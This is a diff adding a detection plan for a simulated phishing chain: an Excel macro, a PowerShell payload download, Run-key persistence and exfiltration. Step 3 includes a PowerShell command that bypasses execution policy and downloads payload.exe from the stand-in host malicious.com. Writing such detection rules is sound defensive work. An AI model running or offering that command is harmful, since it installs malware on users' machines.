@@ -1,0 +1,17 @@
+1. **Initial Access via Email Detection**  
+   - **Details**: Monitor for email events indicating suspicious patterns. Specifically, look for emails with the subject line "Important Update" and attachments named "Invoice_2023.xlsx". This can be done by analyzing email headers and sender addresses for anomalies.
+
+2. **Opening the Malicious Attachment Detection**  
+   - **Details**: Identify instances where Microsoft Excel is executed with command-line arguments indicating macro execution. Specifically, look for events where `srcNode.Image` is `excel.exe` and `srcNode.Cmdline` contains `"C:\\Users\\User\\Downloads\\Invoice_2023.xlsx" /m`.
+
+3. **Macro Execution and Payload Download Detection**  
+   - **Details**: Monitor for PowerShell execution initiated by Excel. Specifically, look for events where `srcNode.Image` is `powershell.exe` and `srcNode.Cmdline` includes `-ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://malicious.com/payload.exe' -OutFile 'C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe'"`.
+
+4. **Execution of the Malicious Payload Detection**  
+   - **Details**: Identify events where the payload executable is executed. Specifically, look for events where `srcNode.Image` is the path to the downloaded payload (e.g., `C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe`) and `relation` is `Process Create`.
+
+5. **Establishing Persistence Detection**  
+   - **Details**: Monitor for registry modifications that add or modify entries in `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`. Specifically, look for events where `srcNode.Image` is `reg.exe` (or similar) and `dstNode.Key` is `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`.
+
+6. **Lateral Movement and Data Exfiltration Detection**  
+   - **Details**: Monitor for unusual outbound network connections initiated by PowerShell. Specifically, look for events where `srcNode.Image` is `powershell.exe` and `dstNode.Dstaddress` is an external IP, especially those known to be malicious. Additionally, track PowerShell commands that access network shares.
